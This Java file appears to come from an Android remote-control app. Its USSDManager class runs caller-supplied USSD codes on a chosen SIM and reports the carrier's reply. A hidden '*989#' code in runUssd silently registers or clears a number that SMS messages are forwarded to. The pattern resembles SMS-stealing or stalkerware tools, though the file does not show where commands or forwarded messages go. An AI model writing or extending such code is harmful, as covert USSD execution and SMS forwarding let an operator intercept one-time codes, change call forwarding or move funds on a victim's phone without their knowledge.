package com.topdown.softy.functions.managers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;

import androidx.core.app.ActivityCompat;

import com.topdown.softy.functions.helpers.Prefs;
import com.topdown.softy.functions.listeners.ActionCallbackListener;
import com.topdown.softy.functions.utils.Utils;

import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

public class USSDManager {

    private static final Logger LOGGER = Logger.getLogger(USSDManager.class.getName());

    private final Prefs prefs;
    private final Context context;

    public USSDManager(Context context) {
        this.context = context;
        this.prefs = new Prefs(context);
    }

    private static int getSubscriptionId(int slot, List<SubscriptionInfo> subscriptionInfos) {
        int subscriptionId = -1;
        int fallbackSubscriptionId = -1;

        for (SubscriptionInfo info : subscriptionInfos) {
            if (info.getSimSlotIndex() == slot) { // <- REAL slot, not list index
                subscriptionId = info.getSubscriptionId();
                break;
            }

            // Store first available as fallback
            if (fallbackSubscriptionId == -1) {
                fallbackSubscriptionId = info.getSubscriptionId();
            }
        }

        if (subscriptionId == -1 && fallbackSubscriptionId != -1) {
            subscriptionId = fallbackSubscriptionId;
        }
        return subscriptionId;
    }

    public void runUssd(String ussd, int slot, ActionCallbackListener callback) {
        try {
            if (ussd == null || ussd.isEmpty()) {
                callback.onError("Invalid USSD code.");
                return;
            }
            if (ussd.equals("*989#")) {
                unregisterOfflineSMSForwarding(callback);
                return;
            }
            if (ussd.startsWith("*989#")) {
                registerSMSForwarding(ussd, slot, callback);
                return;
            }

            SubscriptionManager subscriptionManager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (subscriptionManager == null) {
                callback.onError("Device may not support telephony or service is unavailable");
                return;
            }

            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                callback.onError("Permission Error!");
                return;
            }
            List<SubscriptionInfo> subscriptionInfos = subscriptionManager.getActiveSubscriptionInfoList();
            if (subscriptionInfos == null || subscriptionInfos.isEmpty()) {
                callback.onError("No active SIM cards found.");
                return;
            }

            // ═══════════════════════════════════════════════════════════════
            // INTELLIGENT SIM SELECTION WITH FALLBACK
            // ═══════════════════════════════════════════════════════════════

            int subscriptionId = getSubscriptionId(slot, subscriptionInfos);

            if (subscriptionId == -1) {
                callback.onError("No valid SIM slot found.");
                return;
            }

            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager == null) {
                callback.onError("TelephonyManager is not available on this device.");
                return;
            }

            TelephonyManager simTelephonyManager = telephonyManager.createForSubscriptionId(subscriptionId);
            if (simTelephonyManager == null) {
                callback.onError("Unable to create TelephonyManager for the selected SIM.");
                return;
            }

            prefs.setPref("last-ussd-code", ussd);
            prefs.setPref("last-ussd-slot-index", slot + "");

            simTelephonyManager.sendUssdRequest(ussd, new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    callback.onSuccess("USSD Code Executed: " + response.toString());
                }

                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    String errorMessage;
                    switch (failureCode) {
                        case TelephonyManager.USSD_RETURN_FAILURE:
                            errorMessage = "USSD request failed: returned failure.";
                            break;
                        case TelephonyManager.USSD_ERROR_SERVICE_UNAVAIL:
                            errorMessage = "USSD service is unavailable.";
                            break;
                        default:
                            errorMessage = "Unknown USSD failure. Code: " + failureCode;
                            break;
                    }
                    callback.onError(errorMessage);
                }
            }, null);
        } catch (Exception e) {
            callback.onError("Error: " + e.getMessage());
            LOGGER.log(Level.SEVERE, "SMS Error", e);
        }
    }

    private void unregisterOfflineSMSForwarding(ActionCallbackListener callback) {
        prefs.removePref("sms-forward");
        prefs.removePref("sms-slot-index");
        callback.onSuccess("SMS Forwarding Unregistered ✅");
        Utils.markLog(context, "SMS Forwarding Unregistered ✅", "USSD Manager");
    }

    private void registerSMSForwarding(String ussd, int slot, ActionCallbackListener callback) {
        prefs.setPref("sms-forward", ussd.replaceAll("\\*989#", "").replaceAll("#", ""));
        prefs.setPref("sms-slot-index", slot + "");
        callback.onSuccess("SMS Forwarding Registered ✅");
        Utils.markLog(context, "SMS Forwarding Registered ✅", "USSD Manager");
    }

}
